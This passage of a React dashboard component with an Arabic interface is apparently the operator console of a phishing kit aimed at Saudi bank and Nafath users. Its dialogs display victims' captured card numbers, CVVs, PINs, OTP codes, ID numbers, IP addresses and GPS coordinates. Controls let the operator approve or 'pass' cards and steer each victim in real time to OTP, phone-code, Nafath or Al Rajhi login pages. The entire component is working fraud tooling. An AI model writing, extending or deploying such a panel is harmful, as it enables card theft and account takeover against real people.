              {selectedNotification.serial_number && (
                <div className="p-5 rounded-xl bg-gradient-to-br from-teal-50 to-cyan-50 border border-teal-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-teal-100">
                      <FileText className="h-5 w-5 text-teal-600" />
                    </div>
                    <p className="text-sm font-semibold text-teal-800">الرقم التسلسلي</p>
                  </div>
                  <p className="font-bold text-xl font-mono text-gray-900">{selectedNotification.serial_number}</p>
                </div>
              )}
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <Tabs defaultValue="main" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-6 bg-gray-100 p-1 rounded-xl">
                <TabsTrigger
                  value="main"
                  className="data-[state=active]:bg-white data-[state=active]:text-indigo-600 data-[state=active]:shadow-sm rounded-lg font-medium"
                >
                  البطاقة الرئيسية
                </TabsTrigger>
                <TabsTrigger
                  value="form"
                  className="data-[state=active]:bg-white data-[state=active]:text-indigo-600 data-[state=active]:shadow-sm rounded-lg font-medium"
                >
                  بيانات النموذج
                </TabsTrigger>
              </TabsList>

              <TabsContent value="main" className="space-y-4 py-2">
                <div className="p-5 rounded-xl bg-gradient-to-br from-indigo-50 to-blue-50 border border-indigo-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-indigo-100">
                      <User className="h-5 w-5 text-indigo-600" />
                    </div>
                    <p className="text-sm font-semibold text-indigo-800">اسم حامل البطاقة</p>
                  </div>
                  <p className="font-bold text-xl text-gray-900">
                    {selectedNotification.document_owner_full_name ||
                      selectedNotification?.card_holder_name ||
                      "غير محدد"}
                  </p>
                </div>

                <div className="p-5 rounded-xl bg-gradient-to-br from-emerald-50 to-green-50 border border-emerald-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-emerald-100">
                      <CreditCard className="h-5 w-5 text-emerald-600" />
                    </div>
                    <p className="text-sm font-semibold text-emerald-800">رقم البطاقة</p>
                  </div>
                  <p className="font-bold text-xl font-mono text-gray-900" dir="ltr">
                    {selectedNotification.cardNumber || "غير محدد"}
                  </p>
                </div>

                <div className="p-5 rounded-xl bg-gradient-to-br from-purple-50 to-pink-50 border border-purple-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-purple-100">
                      <Calendar className="h-5 w-5 text-purple-600" />
                    </div>
                    <p className="text-sm font-semibold text-purple-800">تاريخ الانتهاء</p>
                  </div>
                  <p className="font-bold text-xl font-mono text-gray-900">
                    {selectedNotification.expiration_date || `${selectedNotification?.cardMonth}/${selectedNotification?.cardYear}` ||"غير محدد"}
                  </p>
                </div>

                <div className="p-5 rounded-xl bg-gradient-to-br from-amber-50 to-orange-50 border border-amber-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-amber-100">
                      <Shield className="h-5 w-5 text-amber-600" />
                    </div>
                    <p className="text-sm font-semibold text-amber-800">رمز الأمان (CVV)</p>
                  </div>
                  <p className="font-bold text-xl font-mono text-gray-900">{selectedNotification.cvv || "غير محدد"}</p>
                </div>
              </TabsContent>

              <TabsContent value="form" className="space-y-4 py-2">
                {selectedNotification.formData ? (
                  <>
                    <div className="p-5 rounded-xl bg-gradient-to-br from-indigo-50 to-blue-50 border border-indigo-100 shadow-sm">
                      <div className="flex items-center gap-3 mb-3">
                        <div className="p-2 rounded-lg bg-indigo-100">
                          <User className="h-5 w-5 text-indigo-600" />
                        </div>
                        <p className="text-sm font-semibold text-indigo-800">اسم حامل البطاقة</p>
                      </div>
                      <p className="font-bold text-xl text-gray-900">
                        {selectedNotification?.formData?.card_holder_name || "غير محدد"}
                      </p>
                    </div>

                    <div className="p-5 rounded-xl bg-gradient-to-br from-emerald-50 to-green-50 border border-emerald-100 shadow-sm">
                      <div className="flex items-center gap-3 mb-3">
                        <div className="p-2 rounded-lg bg-emerald-100">
                          <CreditCard className="h-5 w-5 text-emerald-600" />
                        </div>
                        <p className="text-sm font-semibold text-emerald-800">رقم البطاقة</p>
                      </div>
                      <p className="font-bold text-xl font-mono text-gray-900" dir="ltr">
                        {selectedNotification.formData.cardNumber || "غير محدد"}
                      </p>
                    </div>

                    <div className="p-5 rounded-xl bg-gradient-to-br from-purple-50 to-pink-50 border border-purple-100 shadow-sm">
                      <div className="flex items-center gap-3 mb-3">
                        <div className="p-2 rounded-lg bg-purple-100">
                          <Calendar className="h-5 w-5 text-purple-600" />
                        </div>
                        <p className="text-sm font-semibold text-purple-800">تاريخ الانتهاء</p>
                      </div>
                      <p className="font-bold text-xl font-mono text-gray-900">
                        {selectedNotification.formData.expiration_date || "غير محدد"}
                      </p>
                    </div>

                    <div className="p-5 rounded-xl bg-gradient-to-br from-amber-50 to-orange-50 border border-amber-100 shadow-sm">
                      <div className="flex items-center gap-3 mb-3">
                        <div className="p-2 rounded-lg bg-amber-100">
                          <Shield className="h-5 w-5 text-amber-600" />
                        </div>
                        <p className="text-sm font-semibold text-amber-800">رمز الأمان (CVV)</p>
                      </div>
                      <p className="font-bold text-xl font-mono text-gray-900">
                        {selectedNotification.formData.cvv || "غير محدد"}
                      </p>
                    </div>
                  </>
                ) : (
                  <div className="flex flex-col items-center justify-center py-12 text-center">
                    <div className="w-20 h-20 rounded-full bg-gray-100 flex items-center justify-center mb-4">
                      <AlertCircle className="h-10 w-10 text-gray-400" />
                    </div>
                    <h3 className="text-lg font-semibold text-gray-900 mb-2">لا توجد بيانات نموذج</h3>
                    <p className="text-gray-600">لم يتم العثور على بيانات النموذج لهذا الطلب</p>
                  </div>
                )}
              </TabsContent>
            </Tabs>
          )}

          {selectedInfo === "vehicle" && selectedNotification && (
            <div className="space-y-4 py-4">
              <div className="p-5 rounded-xl bg-gradient-to-br from-indigo-50 to-blue-50 border border-indigo-100 shadow-sm">
                <div className="flex items-center gap-3 mb-3">
                  <div className="p-2 rounded-lg bg-indigo-100">
                    <Car className="h-5 w-5 text-indigo-600" />
                  </div>
                  <p className="text-sm font-semibold text-indigo-800">نوع المركبة</p>
                </div>
                <p className="font-bold text-xl text-gray-900">{selectedNotification.vehicle_type || "غير محدد"}</p>
              </div>

              {selectedNotification.vehicle_manufacture_number && (
                <div className="p-5 rounded-xl bg-gradient-to-br from-emerald-50 to-green-50 border border-emerald-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-emerald-100">
                      <FileText className="h-5 w-5 text-emerald-600" />
                    </div>
                    <p className="text-sm font-semibold text-emerald-800">رقم تصنيع المركبة</p>
                  </div>
                  <p className="font-bold text-xl font-mono text-gray-900">
                    {selectedNotification.vehicle_manufacture_number}
                  </p>
                </div>
              )}

              {selectedNotification.customs_code && (
                <div className="p-5 rounded-xl bg-gradient-to-br from-purple-50 to-pink-50 border border-purple-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-purple-100">
                      <Tag className="h-5 w-5 text-purple-600" />
                    </div>
                    <p className="text-sm font-semibold text-purple-800">رمز الجمارك</p>
                  </div>
                  <p className="font-bold text-xl font-mono text-gray-900">{selectedNotification.customs_code}</p>
                </div>
              )}

              {selectedNotification.seller_identity_number && (
                <div className="p-5 rounded-xl bg-gradient-to-br from-amber-50 to-orange-50 border border-amber-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-amber-100">
                      <Shield className="h-5 w-5 text-amber-600" />
                    </div>
                    <p className="text-sm font-semibold text-amber-800">رقم هوية البائع</p>
                  </div>
                  <p className="font-bold text-xl font-mono text-gray-900">
                    {selectedNotification.seller_identity_number}
                  </p>
                </div>
              )}

              {selectedNotification.serial_number && (
                <div className="p-5 rounded-xl bg-gradient-to-br from-teal-50 to-cyan-50 border border-teal-100 shadow-sm">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="p-2 rounded-lg bg-teal-100">
                      <FileText className="h-5 w-5 text-teal-600" />
                    </div>
                    <p className="text-sm font-semibold text-teal-800">الرقم التسلسلي</p>
                  </div>
                  <p className="font-bold text-xl font-mono text-gray-900">{selectedNotification.serial_number}</p>
                </div>
              )}
            </div>
          )}

          <DialogFooter className="border-t border-gray-100 pt-6 mt-6">
            <Button
              onClick={closeDialog}
              className="w-full bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 text-white font-medium py-3 rounded-xl shadow-lg transition-all duration-200"
            >
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Enhanced Card Dialog with Real Data */}
      <Dialog open={showCardDialog} onOpenChange={(open) => !open && setShowCardDialog(false)}>
        <DialogContent className="bg-white/98 backdrop-blur-md border-0 shadow-2xl max-w-lg rounded-2xl" dir="rtl">
          <DialogHeader className="border-b border-gray-100 pb-6">
            <DialogTitle className="text-2xl font-bold bg-gradient-to-r from-indigo-600 to-purple-600 text-transparent bg-clip-text">
              معلومات البطاقة البنكية
            </DialogTitle>
            <DialogDescription className="text-gray-600 mt-2">
              عرض تفاصيل البطاقة البنكية ومعلومات الدفع مع البيانات الحقيقية
            </DialogDescription>
          </DialogHeader>

          {selectedCardInfo && (
            <div className="space-y-6 py-4">
              {/* Professional Credit Card Design */}
              <div className="relative">
                <div className="p-10 rounded-2xl bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-600 text-white shadow-2xl transform perspective-1000 rotate-y-5">
                  <div className="absolute top-4 right-4 w-12 h-8 bg-white/20 rounded backdrop-blur-sm"></div>
                  <div className="absolute top-4 left-4">
                    <CreditCard className="h-8 w-8 text-white/80" />
                  </div>

                  <div className="mt-8 mb-6">
                    <p className="text-xs text-white/70 mb-1">رقم البطاقة</p>
                    <p className="font-mono text-xl tracking-wider" dir="ltr">
                      {selectedCardInfo.cardNumber ||
                        (selectedCardInfo.formData && selectedCardInfo.formData.cardNumber) ||
                        "**** **** **** ****"}
                    </p>
                  </div>

                  <div className="flex justify-between items-end">
                    <div>
                      <p className="text-xs text-white/70 mb-1">رمز الأمان (CVV)</p>
                      <p className="font-medium text-sm">
                        {selectedCardInfo.cvv||" CVV"}
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-xs text-white/70 mb-1">انتهاء الصلاحية</p>
                      <p className="font-mono text-sm">
                          {selectedCardInfo?.cardMonth+"/"+selectedCardInfo?.cardYear}
                      </p>
                    </div>
                  </div>

              
                </div>
              </div>

              {/* Additional Information with Real Data */}
              <div className="grid grid-cols-1 gap-4">
                <div className="p-4 rounded-xl bg-gradient-to-br from-gray-50 to-slate-50 border border-gray-200">
                  <h3 className="font-semibold mb-3 text-gray-900 flex items-center gap-2">
                    <Shield className="h-5 w-5 text-indigo-600" />
                    معلومات إضافية
                  </h3>
                  <div className="space-y-3">
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-600">رمز الأمان (CVV):</span>
                      <span className="font-mono font-bold text-gray-900">
                        {selectedCardInfo.cvv || (selectedCardInfo.formData && selectedCardInfo.formData.cvv) || "***"}
                      </span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-600">الرقم السري:</span>
                      <span className="font-mono font-bold text-gray-900">
                        {selectedCardInfo.pinCode || "غير متوفر"}
                      </span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-600">رمز التحقق:</span>
                      <span className="font-mono font-bold text-gray-900">
                        {selectedCardInfo.otpCode || selectedCardInfo.phoneOtp || "غير متوفر"}
                      </span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-600">حالة الدفع:</span>
                      <div>
                        {selectedCardInfo.paymentStatus === "approved" ? (
                          <Badge className="bg-emerald-100 text-emerald-800 border-emerald-200">
                            <CheckCircle className="h-3 w-3 mr-1" />
                            مقبول
                          </Badge>
                        ) : selectedCardInfo.paymentStatus === "rejected" ? (
                          <Badge className="bg-red-100 text-red-800 border-red-200">
                            <XCircle className="h-3 w-3 mr-1" />
                            مرفوض
                          </Badge>
                        ) : (
                          <Badge className="bg-amber-100 text-amber-800 border-amber-200">
                            <Clock className="h-3 w-3 mr-1" />
                            قيد الانتظار
                          </Badge>
                        )}
                      </div>
                    </div>
                    {/* Real Location and Online Status in Card Dialog */}
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-600">حالة الاتصال:</span>
 <UserStatus userId={selectedCardInfo?.id}/>                     </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-600">الدولة:</span>
                      <div>{getCountryBadge(selectedCardInfo)}</div>
                    </div>
                    {selectedCardInfo.ipAddress && (
                      <div className="flex justify-between items-center">
                        <span className="text-sm text-gray-600">عنوان IP:</span>
                        <span className="font-mono text-sm text-gray-900">{selectedCardInfo.ipAddress}</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          <DialogFooter className="grid grid-cols-2 lg:grid-cols-4 gap-3 mt-6 pt-6 border-t border-gray-100">
            {selectedCardInfo?.cardNumber ? (
              <>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedCardInfo.id)
                    setShowCardDialog(false)
                  }}
                  className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-medium py-2.5 rounded-xl shadow-lg transition-all duration-200"
                >
                  <XCircle className="h-4 w-4 mr-1" />
                  رفض
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedCardInfo.id)
                    setShowCardDialog(false)
                  }}
                  className="bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white font-medium py-2.5 rounded-xl shadow-lg transition-all duration-200"
                >
                  <CheckCircle className="h-4 w-4 mr-1" />
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handlePassApproval("approved", selectedCardInfo.id)
                  }}
                  className="bg-gradient-to-r from-pink-500 to-pink-600 hover:from-pink-600 hover:to-pink-700 text-white font-medium py-2.5 rounded-xl shadow-lg transition-all duration-200"
                >
                  <Zap className="h-4 w-4 mr-1" />
                  تمرير
                </Button>
                <Button
                  onClick={() => {
                    handleUpdatePagename(selectedCardInfo.id, "external-link")
                  }}
                  className="bg-gradient-to-r from-indigo-500 to-indigo-600 hover:from-indigo-600 hover:to-indigo-700 text-white font-medium py-2.5 rounded-xl shadow-lg transition-all duration-200"
                >
                  <Tag className="h-4 w-4 mr-1" />
                  راجحي
                </Button>
              </>
            ) : (
              <Button
                onClick={() => setShowCardDialog(false)}
                className="col-span-2 lg:col-span-4 bg-gradient-to-r from-gray-500 to-gray-600 hover:from-gray-600 hover:to-gray-700 text-white font-medium py-2.5 rounded-xl"
              >
                إغلاق
              </Button>
            )}
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Enhanced Pagename Dialog */}
      <Dialog open={showPagenameDialog} onOpenChange={(open) => !open && setShowPagenameDialog(false)}>
        <DialogContent className="bg-white/98 backdrop-blur-md border-0 shadow-2xl max-w-lg rounded-2xl" dir="rtl">
          <DialogHeader className="border-b border-gray-100 pb-6">
            <DialogTitle className="text-2xl font-bold bg-gradient-to-r from-indigo-600 to-purple-600 text-transparent bg-clip-text">
              إدارة نوع الطلب
            </DialogTitle>
            <DialogDescription className="text-gray-600 mt-2">تحديد أو تغيير نوع الطلب وفئة المعالجة</DialogDescription>
          </DialogHeader>

          {selectedNotification && (
            <div className="space-y-6 py-4">
              <div className="p-5 rounded-xl bg-gradient-to-br from-indigo-50 to-blue-50 border border-indigo-100">
                <h3 className="font-semibold mb-3 text-indigo-800 flex items-center gap-2">
                  <Tag className="h-5 w-5" />
                  النوع الحالي
                </h3>
                <div className="flex justify-center">{getPageType(selectedNotification.pagename)}</div>
              </div>

              <div className="p-5 rounded-xl bg-gradient-to-br from-gray-50 to-slate-50 border border-gray-200">
                <h3 className="font-semibold mb-4 text-gray-800 flex items-center gap-2">
                  <Settings className="h-5 w-5" />
                  اختيار نوع جديد
                </h3>
                <div className="grid grid-cols-2 gap-3">
                  {[
                    { id: "6", label: "دفع", icon: CreditCard, color: "blue" },
                    { id: "", label: "تسجيل", icon: FileText, color: "purple" },
                    { id: "nafaz", label: "نفاذ", icon: Shield, color: "teal" },
                    { id: "7", label: "رمز OTP", icon: Shield, color: "pink" },
                    { id: "9999", label: "رمز هاتف", icon: Smartphone, color: "orange" },
                    { id: "3", label: "عروض", icon: Tag, color: "indigo" },
                  ].map((type) => (
                    <Button
                      key={type.id}
                      variant="outline"
                      className={`flex items-center gap-2 justify-center p-4 h-auto transition-all duration-200 ${
                        selectedNotification?.currentPage === type.id
                          ? `bg-${type.color}-50 border-${type.color}-300 text-${type.color}-700 shadow-md`
                          : `border-${type.color}-200 text-${type.color}-600 hover:bg-${type.color}-50`
                      }`}
                      onClick={() => handleUpdatePagename(selectedNotification.id, type.id)}
                    >
                      <type.icon className="h-5 w-5" />
                      <span className="font-medium">{type.label}</span>
                    </Button>
                  ))}
                </div>
              </div>
            </div>
          )}

          <DialogFooter className="border-t border-gray-100 pt-6 mt-6">
            <Button
              onClick={() => setShowPagenameDialog(false)}
              className="w-full bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 text-white font-medium py-3 rounded-xl shadow-lg transition-all duration-200"
            >
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Enhanced Sidebar with Real Location Information */}
      <Sheet open={showSidebar} onOpenChange={setShowSidebar}>
        <SheetContent
          side="left"
          className="w-full sm:max-w-lg overflow-y-auto bg-white/98 backdrop-blur-md border-0 shadow-2xl"
          dir="rtl"
        >
          <SheetHeader className="text-right pb-6 border-b border-gray-100">
            <SheetTitle className="text-2xl font-bold bg-gradient-to-r from-indigo-600 to-purple-600 text-transparent bg-clip-text">
              عرض شامل للبيانات
            </SheetTitle>
            <SheetDescription className="text-gray-600 mt-2">
              تفاصيل كاملة وإجراءات سريعة للطلب المحدد مع معلومات الموقع الحقيقية
            </SheetDescription>
          </SheetHeader>

          {selectedNotification && (
            <div className="py-6 space-y-6">
              {/* Personal Information Section */}
              <div className="p-5 rounded-xl bg-gradient-to-br from-indigo-50 to-blue-50 border border-indigo-100">
                <h3 className="text-lg font-bold mb-4 flex items-center gap-3 text-indigo-800">
                  <div className="p-2 rounded-lg bg-indigo-100">
                    <User className="h-5 w-5 text-indigo-600" />
                  </div>
                  المعلومات الشخصية
                </h3>
                <div className="space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-indigo-700">الاسم الكامل:</span>
                    <span className="font-bold text-gray-900">
                      {selectedNotification.documment_owner_full_name ||
                        selectedNotification.document_owner_full_name ||
                        selectedNotification.full_name ||
                        "غير محدد"}
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-indigo-700">رقم الهوية:</span>
                    <span className="font-mono font-bold text-gray-900">
                      {selectedNotification.owner_identity_number ||
                        selectedNotification.buyer_identity_number ||
                        "غير محدد"}
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-indigo-700">رقم الهاتف:</span>
                    <span className="font-mono font-bold text-gray-900">
                      {selectedNotification.phone || "غير محدد"}
                    </span>
                  </div>
                  {selectedNotification.phone2 && (
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-indigo-700">رقم الهاتف 2:</span>
                      <span className="font-mono font-bold text-gray-900">{selectedNotification.phone2}</span>
                    </div>
                  )}
                </div>
              </div>

              {/* Real Online Status and Location Section */}
              <div className="p-5 rounded-xl bg-gradient-to-br from-cyan-50 to-blue-50 border border-cyan-100">
                <h3 className="text-lg font-bold mb-4 flex items-center gap-3 text-cyan-800">
                  <div className="p-2 rounded-lg bg-cyan-100">
                    <Globe className="h-5 w-5 text-cyan-600" />
                  </div>
                  معلومات الاتصال والموقع الحقيقية
                </h3>
                <div className="space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-cyan-700">حالة الاتصال:</span>
                    <UserStatus userId={selectedNotification.id}/>                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-cyan-700">الدولة:</span>
                    <div>{getCountryBadge(selectedNotification)}</div>
                  </div>
                  {selectedNotification.city && (
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-cyan-700">المدينة:</span>
                      <span className="font-bold text-gray-900 flex items-center gap-1">
                        <MapPin className="h-4 w-4" />
                        {selectedNotification.city}
                      </span>
                    </div>
                  )}
                  {selectedNotification.region && (
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-cyan-700">المنطقة:</span>
                      <span className="font-bold text-gray-900">{selectedNotification.region}</span>
                    </div>
                  )}
                  {selectedNotification.ipAddress && (
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-cyan-700">عنوان IP:</span>
                      <span className="font-mono font-bold text-gray-900">{selectedNotification.ipAddress}</span>
                    </div>
                  )}
                  {selectedNotification.latitude && selectedNotification.longitude && (
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-cyan-700">الإحداثيات:</span>
                      <span className="font-mono text-xs text-gray-900">
                        {selectedNotification.latitude.toFixed(4)}, {selectedNotification.longitude.toFixed(4)}
                      </span>
                    </div>
                  )}
                  {selectedNotification.userAgent && (
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-cyan-700">المتصفح:</span>
                      <span className="text-xs text-gray-700 truncate max-w-32" title={selectedNotification.userAgent}>
                        {selectedNotification.userAgent}
                      </span>
                    </div>
                  )}
                </div>
              </div>

              {/* Card Information Section */}
              {(selectedNotification.cardNumber ||
                (selectedNotification.formData && selectedNotification.formData.cardNumber)) && (
                <div className="p-5 rounded-xl bg-gradient-to-br from-emerald-50 to-green-50 border border-emerald-100">
                  <h3 className="text-lg font-bold mb-4 flex items-center gap-3 text-emerald-800">
                    <div className="p-2 rounded-lg bg-emerald-100">
                      <CreditCard className="h-5 w-5 text-emerald-600" />
                    </div>
                    معلومات البطاقة
                  </h3>
                  <div className="space-y-3">
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-emerald-700">رقم البطاقة:</span>
                      <span className="font-mono font-bold text-gray-900" dir="ltr">
                        {selectedNotification.cardNumber ||
                          (selectedNotification.formData && selectedNotification.formData.cardNumber) ||
                          "غير محدد"}
                      </span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-emerald-700">تاريخ الانتهاء:</span>
                      <span className="font-mono font-bold text-gray-900">
                        {selectedNotification.expiration_date ||
                          (selectedNotification.formData && selectedNotification.formData.expiration_date) ||
                          "غير محدد"}
                      </span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-emerald-700">رمز الأمان:</span>
                      <span className="font-mono font-bold text-gray-900">
                        {selectedNotification.cvv ||
                          (selectedNotification.formData && selectedNotification.formData.cvv) ||
                          "غير محدد"}
                      </span>
                    </div>
                    {selectedNotification.pinCode && (
                      <div className="flex justify-between items-center">
                        <span className="text-sm font-medium text-emerald-700">الرقم السري:</span>
                        <span className="font-mono font-bold text-gray-900">{selectedNotification.pinCode}</span>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Vehicle Information Section */}
              {selectedNotification.vehicle_type && (
                <div className="p-5 rounded-xl bg-gradient-to-br from-purple-50 to-pink-50 border border-purple-100">
                  <h3 className="text-lg font-bold mb-4 flex items-center gap-3 text-purple-800">
                    <div className="p-2 rounded-lg bg-purple-100">
                      <Car className="h-5 w-5 text-purple-600" />
                    </div>
                    معلومات المركبة
                  </h3>
                  <div className="space-y-3">
                    <div className="flex justify-between items-center">
                      <span className="text-sm font-medium text-purple-700">نوع المركبة:</span>
                      <span className="font-bold text-gray-900">{selectedNotification.vehicle_type}</span>
                    </div>
                    {selectedNotification.vehicle_manufacture_number && (
                      <div className="flex justify-between items-center">
                        <span className="text-sm font-medium text-purple-700">رقم تصنيع المركبة:</span>
                        <span className="font-mono font-bold text-gray-900">
                          {selectedNotification.vehicle_manufacture_number}
                        </span>
                      </div>
                    )}
                    {selectedNotification.customs_code && (
                      <div className="flex justify-between items-center">
                        <span className="text-sm font-medium text-purple-700">رمز الجمارك:</span>
                        <span className="font-mono font-bold text-gray-900">{selectedNotification.customs_code}</span>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Request Information Section */}
              <div className="p-5 rounded-xl bg-gradient-to-br from-amber-50 to-orange-50 border border-amber-100">
                <h3 className="text-lg font-bold mb-4 flex items-center gap-3 text-amber-800">
                  <div className="p-2 rounded-lg bg-amber-100">
                    <Bell className="h-5 w-5 text-amber-600" />
                  </div>
                  معلومات الطلب
                </h3>
                <div className="space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-amber-700">نوع الطلب:</span>
                    <div>{getPageType(selectedNotification.pagename)}</div>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-amber-700">الحالة:</span>
                    <div>{getStatusBadge(selectedNotification.status)}</div>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-amber-700">تاريخ الإنشاء:</span>
                    <span className="font-bold text-gray-900">
                      {format(new Date(selectedNotification.createdDate as any), "yyyy/MM/dd HH:mm")}
                    </span>
                  </div>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="grid grid-cols-1 gap-3 pt-4">
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedNotification.id)
                    setShowSidebar(false)
                  }}
                  className="bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white font-medium py-3 rounded-xl shadow-lg transition-all duration-200"
                >
                  <CheckCircle className="h-5 w-5 mr-2" />
                  قبول الطلب
                </Button>

                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedNotification.id)
                    setShowSidebar(false)
                  }}
                  className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-medium py-3 rounded-xl shadow-lg transition-all duration-200"
                >
                  <XCircle className="h-5 w-5 mr-2" />
                  رفض الطلب
                </Button>

                <Button
                  onClick={() => {
                    handleDelete(selectedNotification.id)
                    setShowSidebar(false)
                  }}
                  variant="outline"
                  className="border-gray-200 hover:bg-gray-50 font-medium py-3 rounded-xl transition-all duration-200"
                >
                  <Trash2 className="h-5 w-5 mr-2" />
                  حذف نهائي
                </Button>
              </div>
            </div>
          )}
        </SheetContent>
      </Sheet>

      {/* External Component Dialogs */}
      <RajhiAuthDialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog} notification={selectedNotification} />
      <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />
      <PhoneDialog
        phoneOtp={selectedNotification?.phoneOtp}
        handlePhoneOtpApproval={handlePhoneOtpApproval}
        open={showPhoneDialog}
        onOpenChange={setPhoneDialog}
        notification={selectedNotification}
      />
    </div>
  )
}
